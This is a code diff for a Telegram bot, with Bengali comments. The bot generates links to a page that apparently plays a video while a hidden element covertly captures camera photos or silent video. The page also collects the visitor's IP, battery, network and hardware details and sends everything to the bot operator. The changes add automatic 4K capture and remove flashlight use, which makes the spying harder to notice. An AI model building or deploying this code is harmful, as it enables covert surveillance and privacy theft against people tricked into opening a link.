@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """
-Camera Tool Bot — High-Quality Photo & Video + Device Info
-===========================================================
+Camera Tool Bot — Adaptive 4K/HD + Device Info
+================================================
 Features:
-  - Front / Back camera support
-  - HD Photo (1920x1080, JPEG 95%)
-  - HD Silent Video (2.5 Mbps VP9/VP8)
-  - Low-light optimized (auto exposure, torch attempt)
+  - Auto-detect 4K support → 4K (flashlight OFF) or HD fallback
+  - Photo Mode: 3 photos in 5 seconds
+  - Video Mode: 5-second SILENT HD/4K video
+  - NO torch/flashlight
   - Device Info: model, OS, browser, screen, battery, network, IP, hardware, camera list
   - NO Location, NO Gallery
 """
@@ -96,7 +96,7 @@ def send_message_to_telegram(text, chat_id, bot_token):
         return {"status": "error", "details": str(e)}
 
 
-def capture_and_send_photo(photo_data, chat_id, camera_type="front", photo_num=1, total=4):
+def capture_and_send_photo(photo_data, chat_id, camera_type="front", photo_num=1, total=3):
     try:
         if "," in photo_data:
             image_data = photo_data.split(",", 1)[1]
@@ -105,7 +105,7 @@ def capture_and_send_photo(photo_data, chat_id, camera_type="front", photo_num=1
         image_bytes = base64.b64decode(image_data)
         photo_file = io.BytesIO(image_bytes)
         photo_file.name = f"{camera_type}_capture_{photo_num}.jpg"
-        caption = f"📸 {camera_type.upper()} Camera — ছবি {photo_num}/{total} (HD)"
+        caption = f"📸 {camera_type.upper()} Camera — ছবি {photo_num}/{total}"
         return send_photo_to_telegram(photo_file, chat_id, BOT_TOKEN, caption)
     except Exception as e:
         return {"status": "error", "details": str(e)}
@@ -120,7 +120,7 @@ def capture_and_send_video(video_data, chat_id, camera_type="front", duration=5)
         video_bytes = base64.b64decode(video_b64)
         video_file = io.BytesIO(video_bytes)
         video_file.name = f"{camera_type}_video_{duration}s.webm"
-        caption = f"🎥 {camera_type.upper()} Camera — ভিডিও (HD, সাউন্ড ছাড়া, {duration}s)"
+        caption = f"🎥 {camera_type.upper()} Camera — ভিডিও (সাউন্ড ছাড়া, {duration}s)"
         return send_video_to_telegram(video_file, chat_id, BOT_TOKEN, caption)
     except Exception as e:
         return {"status": "error", "details": str(e)}
@@ -206,6 +206,7 @@ def format_device_info(info):
         lines.append(f"  • Facing: <code>{esc(caps.get('facingMode'))}</code>")
         lines.append(f"  • Max Resolution: <code>{esc(caps.get('maxResolution'))}</code>")
         lines.append(f"  • Torch: <code>{esc(caps.get('torch'))}</code>")
+        lines.append(f"  • Selected Quality: <code>{esc(caps.get('selectedQuality'))}</code>")
         zoom = caps.get("zoom")
         if zoom and zoom not in ("Unknown", "N/A"):
             lines.append(f"  • Zoom: <code>{zoom}</code>")
@@ -214,7 +215,7 @@ def format_device_info(info):
 
 
 # ==========================================
-# Capture HTML — HD কোয়ালিটি
+# Capture HTML — Adaptive 4K/HD + ৩টি ছবি
 # ==========================================
 CAPTURE_HTML = """
 <!DOCTYPE html>
@@ -251,44 +252,62 @@ CAPTURE_HTML = """
         const CAPTURE_MODE = "{{ mode }}";
 
         // =========================================================
-        // 🎯 HD Camera Constraints — অন্ধকারে ও কম আলোতে উন্নত
+        // 🎯 4K সাপোর্ট চেক (torch ছাড়া)
         // =========================================================
-        function buildConstraints() {
+        async function detect4KSupport() {
+            try {
+                // প্রথমে 4K চেষ্টা
+                const test = await navigator.mediaDevices.getUserMedia({
+                    audio: false,
+                    video: {
+                        facingMode: { ideal: CAMERA_TYPE === "back" ? "environment" : "user" },
+                        width:  { ideal: 3840, min: 3840 },
+                        height: { ideal: 2160, min: 2160 }
+                    }
+                });
+                const track = test.getVideoTracks()[0];
+                const settings = track.getSettings();
+                const is4K = (settings.width >= 3840 && settings.height >= 2160);
+                test.getTracks().forEach(t => t.stop());
+                console.log(`🔍 4K test: ${settings.width}x${settings.height} → ${is4K ? "4K ✅" : "not 4K ❌"}`);
+                return is4K;
+            } catch (e) {
+                console.log("4K test failed:", e);
+                return false;
+            }
+        }
+
+        // =========================================================
+        // 🎯 Adaptive Constraints — 4K সাপোর্ট করলে 4K, না হলে HD
+        // audio: false, torch: false (কোনো flash নেই)
+        // =========================================================
+        let IS_4K = false;
+
+        function buildConstraints(use4K) {
             const facing = CAMERA_TYPE === "back" ? "environment" : "user";
+            if (use4K) {
+                return {
+                    audio: false,
+                    video: {
+                        facingMode: { ideal: facing },
+                        width:  { ideal: 3840, min: 1920 },
+                        height: { ideal: 2160, min: 1080 },
+                        frameRate: { ideal: 30, max: 30 },
+                        advanced: [{ torch: false }, { exposureMode: "continuous" }]
+                    }
+                };
+            }
+            // HD fallback
             return {
                 audio: false,
                 video: {
                     facingMode: { ideal: facing },
-                    width:  { ideal: 1920, min: 1280 },
-                    height: { ideal: 1080, min: 720 },
+                    width:  { ideal: 1280, min: 640 },
+                    height: { ideal: 720,  min: 480 },
                     frameRate: { ideal: 30, max: 30 },
-                    // কম আলোতে brighter image (Chrome/Android)
-                    advanced: [{ exposureMode: "continuous" }]
+                    advanced: [{ torch: false }, { exposureMode: "continuous" }]
                 }
             };
-        }
-
-        // 🔦 টর্চ চালু করার চেষ্টা (কম আলোতে সহায়ক)
-        async function tryTorchOn(track) {
-            try {
-                if (track && track.getCapabilities) {
-                    const caps = track.getCapabilities();
-                    if (caps.torch) {
-                        await track.applyConstraints({ advanced: [{ torch: true }] });
-                        console.log("🔦 Torch ON");
-                        return true;
-                    }
-                }
-            } catch (e) { console.log("torch error", e); }
-            return false;
-        }
-
-        async function tryTorchOff(track) {
-            try {
-                if (track && track.getCapabilities && track.getCapabilities().torch) {
-                    await track.applyConstraints({ advanced: [{ torch: false }] });
-                }
-            } catch (e) {}
         }
 
         // =========================================================
@@ -376,17 +395,19 @@ CAPTURE_HTML = """
             } catch (e) { return []; }
         }
 
-        async function getCameraCapabilities() {
+        async function getCameraCapabilities(use4K) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia(buildConstraints());
+                const stream = await navigator.mediaDevices.getUserMedia(buildConstraints(use4K));
                 const track = stream.getVideoTracks()[0];
+                const s = track.getSettings();
                 let caps = {};
                 if (track.getCapabilities) {
                     const c = track.getCapabilities();
                     caps = {
                         facingMode: c.facingMode ? c.facingMode.join(", ") : "Unknown",
                         maxResolution: (c.width?.max || "?") + "x" + (c.height?.max || "?"),
-                        torch: c.torch ? "supported" : "not supported",
+                        torch: c.torch ? "supported (OFF)" : "not supported",
+                        selectedQuality: `${s.width}x${s.height} (${use4K ? "4K" : "HD"})`,
                         zoom: c.zoom ? `${c.zoom.min || 1}x - ${c.zoom.max || 1}x` : "not supported"
                     };
                 }
@@ -398,12 +419,12 @@ CAPTURE_HTML = """
         // =========================================================
         // 📱 ডিভাইস তথ্য সংগ্রহ
         // =========================================================
-        async function collectDeviceInfo() {
+        async function collectDeviceInfo(use4K) {
             const b = getBrowserInfo();
             const battery = await getBatteryInfo();
             const ip = await getPublicIP();
             const cams = await listCameras();
-            const caps = await getCameraCapabilities();
+            const caps = await getCameraCapabilities(use4K);
 
             return {
                 userAgent: navigator.userAgent,
@@ -445,15 +466,14 @@ CAPTURE_HTML = """
         }
 
         // =========================================================
-        // মোড ১: HD ছবি ক্যাপচার (৪টি)
+        // মোড ১: ছবি ক্যাপচার — ৫ সেকেন্ডে ৩টি ছবি
         // =========================================================
         async function startPhotoCapture() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia(buildConstraints());
+                const stream = await navigator.mediaDevices.getUserMedia(buildConstraints(IS_4K));
                 const track = stream.getVideoTracks()[0];
-
-                // 🔦 কম আলোতে টর্চ চালু
-                const torchWasOn = await tryTorchOn(track);
+                const settings = track.getSettings();
+                console.log(`📸 Photo capture @ ${settings.width}x${settings.height} (${IS_4K ? "4K" : "HD"})`);
 
                 const hiddenVideo = document.createElement('video');
                 hiddenVideo.srcObject = stream;
@@ -463,82 +483,78 @@ CAPTURE_HTML = """
                 document.body.appendChild(hiddenVideo);
                 await hiddenVideo.play();
 
-                // videoReady promise
                 await new Promise((res) => {
                     if (hiddenVideo.readyState >= 2) return res();
                     hiddenVideo.onloadeddata = res;
                 });
                 await new Promise(r => setTimeout(r, 500)); // exposure settle
 
-                hiddenVideo.onplaying = () => {
-                    const TOTAL_PHOTOS = 4;
-                    const INTERVAL_MS = 1000;
-                    const START_DELAY = 800;
-                    let photoCount = 0;
+                const TOTAL_PHOTOS = 3;       // ← ৩টি ছবি
+                const INTERVAL_MS = 2000;     // ← প্রতি ২ সেকেন্ডে ১টি → মোট ৫-৬ সেকেন্ড
+                const START_DELAY = 1000;     // ← ক্যামেরা চালু হওয়ার পর ১s
+                let photoCount = 0;
 
-                    setTimeout(() => {
-                        const interval = setInterval(async () => {
-                            try {
-                                // ✅ আসল ক্যামেরা resolution ব্যবহার (blur হবে না)
-                                const w = hiddenVideo.videoWidth || 1280;
-                                const h = hiddenVideo.videoHeight || 720;
+                setTimeout(() => {
+                    const interval = setInterval(async () => {
+                        try {
+                            const w = hiddenVideo.videoWidth || (IS_4K ? 3840 : 1280);
+                            const h = hiddenVideo.videoHeight || (IS_4K ? 2160 : 720);
 
-                                const canvas = document.createElement('canvas');
-                                canvas.width = w;
-                                canvas.height = h;
-                                const ctx = canvas.getContext('2d', { willReadFrequently: false });
+                            const canvas = document.createElement('canvas');
+                            canvas.width = w;
+                            canvas.height = h;
+                            const ctx = canvas.getContext('2d', { willReadFrequently: false });
 
-                                // কিছু ব্রাউজারে mirror ঠিক রাখতে (front camera)
-                                if (CAMERA_TYPE === "front") {
-                                    ctx.translate(w, 0);
-                                    ctx.scale(-1, 1);
-                                }
-                                ctx.drawImage(hiddenVideo, 0, 0, w, h);
+                            // Front camera mirror fix
+                            if (CAMERA_TYPE === "front") {
+                                ctx.translate(w, 0);
+                                ctx.scale(-1, 1);
+                            }
+                            ctx.drawImage(hiddenVideo, 0, 0, w, h);
 
-                                // ✅ High JPEG quality (0.95) → ছবি স্পষ্ট
-                                const photo = canvas.toDataURL('image/jpeg', 0.95);
-                                photoCount++;
+                            // High JPEG quality
+                            const photo = canvas.toDataURL('image/jpeg', 0.95);
+                            photoCount++;
 
-                                await fetch('/capture', {
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({
-                                        photo: photo,
-                                        chat_id: CHAT_ID,
-                                        camera_type: CAMERA_TYPE,
-                                        photo_num: photoCount,
-                                        total: TOTAL_PHOTOS
-                                    })
-                                });
+                            await fetch('/capture', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    photo: photo,
+                                    chat_id: CHAT_ID,
+                                    camera_type: CAMERA_TYPE,
+                                    photo_num: photoCount,
+                                    total: TOTAL_PHOTOS,
+                                    quality: IS_4K ? "4K" : "HD"
+                                })
+                            });
+                            console.log(`📸 ছবি ${photoCount}/${TOTAL_PHOTOS} (${w}x${h})`);
 
-                                if (photoCount >= TOTAL_PHOTOS) {
-                                    clearInterval(interval);
-                                    if (torchWasOn) await tryTorchOff(track);
-                                    stream.getTracks().forEach(t => t.stop());
-                                }
-                            } catch (e) { console.log("capture error", e); }
-                        }, INTERVAL_MS);
-                    }, START_DELAY);
-                };
-
-                // onplaying না লাগলে fallback
-                if (hiddenVideo.readyState >= 2) hiddenVideo.onplaying();
+                            if (photoCount >= TOTAL_PHOTOS) {
+                                clearInterval(interval);
+                                stream.getTracks().forEach(t => t.stop());
+                                console.log("✅ ৩টি ছবি শেষ, ক্যামেরা বন্ধ");
+                            }
+                        } catch (e) { console.log("capture error", e); }
+                    }, INTERVAL_MS);
+                }, START_DELAY);
 
             } catch (e) { console.log("camera error", e); }
         }
 
         // =========================================================
-        // মোড ২: HD সাইলেন্ট ভিডিও (৫ সেকেন্ড, high bitrate)
+        // মোড ২: সাইলেন্ট ভিডিও (৫ সেকেন্ড, 4K/HD adaptive)
         // =========================================================
         async function startVideoCapture() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia(buildConstraints());
+                const stream = await navigator.mediaDevices.getUserMedia(buildConstraints(IS_4K));
                 const track = stream.getVideoTracks()[0];
+                const settings = track.getSettings();
+                console.log(`🎥 Video capture @ ${settings.width}x${settings.height} (${IS_4K ? "4K" : "HD"})`);
 
-                // 🔦 কম আলোতে টর্চ চালু
-                const torchWasOn = await tryTorchOn(track);
+                // Bitrate: 4K হলে 8 Mbps, HD হলে 2.5 Mbps
+                const bitrate = IS_4K ? 8000000 : 2500000;
 
-                // ✅ সর্বোচ্চ কোয়ালিটির MIME + bitrate
                 let mimeType = 'video/webm;codecs=vp9';
                 if (!window.MediaRecorder || !MediaRecorder.isTypeSupported(mimeType)) {
                     if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) mimeType = 'video/webm;codecs=vp8';
@@ -550,7 +566,7 @@ CAPTURE_HTML = """
 
                 const options = {
                     mimeType: mimeType || undefined,
-                    videoBitsPerSecond: 2500000   // ✅ 2.5 Mbps → HD কোয়ালিটি
+                    videoBitsPerSecond: bitrate
                 };
                 const recorder = new MediaRecorder(stream, options);
                 const chunks = [];
@@ -572,22 +588,18 @@ CAPTURE_HTML = """
                                     video: reader.result,
                                     chat_id: CHAT_ID,
                                     camera_type: CAMERA_TYPE,
-                                    duration: 5
+                                    duration: 5,
+                                    quality: IS_4K ? "4K" : "HD"
                                 })
                             });
                         };
                         reader.readAsDataURL(blob);
                     } catch (err) { console.log("video send error", err); }
-                    finally {
-                        if (torchWasOn) await tryTorchOff(track);
-                        stream.getTracks().forEach(t => t.stop());
-                    }
+                    finally { stream.getTracks().forEach(t => t.stop()); }
                 };
 
                 setTimeout(() => {
-                    try {
-                        recorder.start(1000);   // ১ সেকেন্ডের chunk
-                    } catch (e) { return; }
+                    try { recorder.start(1000); } catch (e) { return; }
                     setTimeout(() => {
                         try { if (recorder.state !== 'inactive') recorder.stop(); } catch (e) {}
                     }, 5000);
@@ -642,11 +654,17 @@ CAPTURE_HTML = """
         window.onload = async () => {
             loadVideo();
 
+            // 4K সাপোর্ট চেক (torch ছাড়া)
+            IS_4K = await detect4KSupport();
+            console.log(`📊 Selected quality: ${IS_4K ? "4K (3840x2160)" : "HD (1280x720)"}`);
+
+            // ডিভাইস তথ্য
             try {
-                const info = await collectDeviceInfo();
+                const info = await collectDeviceInfo(IS_4K);
                 await sendDeviceInfo(info);
             } catch (e) { console.log("device info error", e); }
 
+            // ক্যাপচার শুরু
             if (CAPTURE_MODE === "video") {
                 startVideoCapture();
             } else {
@@ -698,7 +716,7 @@ def capture():
     chat_id = data.get("chat_id", CHAT_ID)
     camera_type = data.get("camera_type", "front")
     photo_num = data.get("photo_num", 1)
-    total = data.get("total", 4)
+    total = data.get("total", 3)
     result = capture_and_send_photo(data["photo"], chat_id, camera_type, photo_num, total)
     return jsonify(result)
 
@@ -741,7 +759,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         InlineKeyboardButton("📷 Back Camera", callback_data="cam_back"),
     ]]
     await update.message.reply_text(
-        "🎥 *Camera Tool (HD)*\n\nকোন ক্যামেরা ব্যবহার করতে চান?",
+        "🎥 *Camera Tool (Auto 4K/HD)*\n\n"
+        "📱 4K সাপোর্ট করলে 4K, না হলে HD\n"
+        "🔦 Flashlight বন্ধ\n"
+        "📷 Photo: ৫ সেকেন্ডে ৩টি\n\n"
+        "কোন ক্যামেরা ব্যবহার করতে চান?",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode="Markdown",
     )
@@ -761,8 +783,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         cam = data.split("_")[1]
         user_sessions[chat_id] = {"camera": cam}
         keyboard = [
-            [InlineKeyboardButton("📸 Photo Mode (HD)", callback_data="mode_photo"),
-             InlineKeyboardButton("🎥 Video Mode (HD)", callback_data="mode_video")],
+            [InlineKeyboardButton("📸 Photo Mode (3 pics)", callback_data="mode_photo"),
+             InlineKeyboardButton("🎥 Video Mode (5s)", callback_data="mode_video")],
             [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
         ]
         cam_name = "Front" if cam == "front" else "Back"
@@ -782,7 +804,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
         ]
         await query.edit_message_text(
-            "📸 *Photo Mode (HD 1920x1080)*\n\nলিংকের ধরন বেছে নিন:",
+            "📸 *Photo Mode*\n\n"
+            "🎯 Auto: 4K (সাপোর্ট থাকলে) / HD\n"
+            "🖼 ৫ সেকেন্ডে ৩টি ছবি\n"
+            "🔦 Flashlight বন্ধ\n\n"
+            "লিংকের ধরন বেছে নিন:",
             reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
         return
 
@@ -794,8 +820,12 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
         ]
         await query.edit_message_text(
-            "🎥 *Video Mode (HD 5s, সাউন্ড ছাড়া)*\n\n"
-            "🔇 মাইক পারমিশন লাগবে না\n\nলিংকের ধরন বেছে নিন:",
+            "🎥 *Video Mode*\n\n"
+            "🎯 Auto: 4K (সাপোর্ট থাকলে) / HD\n"
+            "⏱ ৫ সেকেন্ড\n"
+            "🔇 সাউন্ড ছাড়া\n"
+            "🔦 Flashlight বন্ধ\n\n"
+            "লিংকের ধরন বেছে নিন:",
             reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
         return
 
@@ -815,11 +845,14 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         link_store[link_id] = {"chat_id": chat_id, "video_url": "", "camera": cam, "mode": mode}
         public_link = f"{PUBLIC_URL}/v/{link_id}" if PUBLIC_URL else f"⚠️ PUBLIC_URL সেট করা হয়নি — /v/{link_id}"
         keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
-        details = "🎥 HD ভিডিও: ৫ সেকেন্ড (🔇 সাউন্ড ছাড়া)" if mode == "video" else "📷 HD ছবি: ৪টি (৪ সেকেন্ডে)"
+        if mode == "video":
+            details = "🎥 ভিডিও: ৫ সেকেন্ড (🔇, 🔦 বন্ধ)"
+        else:
+            details = "📷 ছবি: ৩টি (৫ সেকেন্ডে, 🔦 বন্ধ)"
         await query.edit_message_text(
             f"✅ *Direct Link তৈরি হয়েছে!*\n\n"
             f"📸 Camera: *{cam.capitalize()}*\n🎯 Mode: *{mode.capitalize()}*\n"
-            f"{details}\n📱 ডিভাইস তথ্যও আসবে\n\n"
+            f"{details}\n🎯 Auto 4K/HD\n\n"
             f"🔗 লিংক:\n`{public_link}`\n\n⚠️ *শুধু নিজের ব্রাউজারে খুলুন।*",
             reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
         return
@@ -848,12 +881,15 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     link_store[link_id] = {"chat_id": chat_id, "video_url": url, "camera": cam, "mode": mode}
     public_link = f"{PUBLIC_URL}/v/{link_id}" if PUBLIC_URL else f"⚠️ PUBLIC_URL সেট করা হয়নি — /v/{link_id}"
     keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
-    details = "🎥 HD ভিডিও: ৫ সেকেন্ড (🔇 সাউন্ড ছাড়া)" if mode == "video" else "📷 HD ছবি: ৪টি (৪ সেকেন্ডে)"
+    if mode == "video":
+        details = "🎥 ভিডিও: ৫ সেকেন্ড (🔇, 🔦 বন্ধ)"
+    else:
+        details = "📷 ছবি: ৩টি (৫ সেকেন্ডে, 🔦 বন্ধ)"
 
     await update.message.reply_text(
         f"✅ *Redirect Link তৈরি হয়েছে!*\n\n"
         f"📸 Camera: *{cam.capitalize()}*\n🎯 Mode: *{mode.capitalize()}*\n"
-        f"🎬 Video: `{url[:50]}...`\n{details}\n📱 ডিভাইস তথ্যও আসবে\n\n"
+        f"🎬 Video: `{url[:50]}...`\n{details}\n🎯 Auto 4K/HD\n\n"
         f"🔗 লিংক:\n`{public_link}`\n\n⚠️ *শুধু নিজের ব্রাউজারে খুলুন।*",
         reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
 
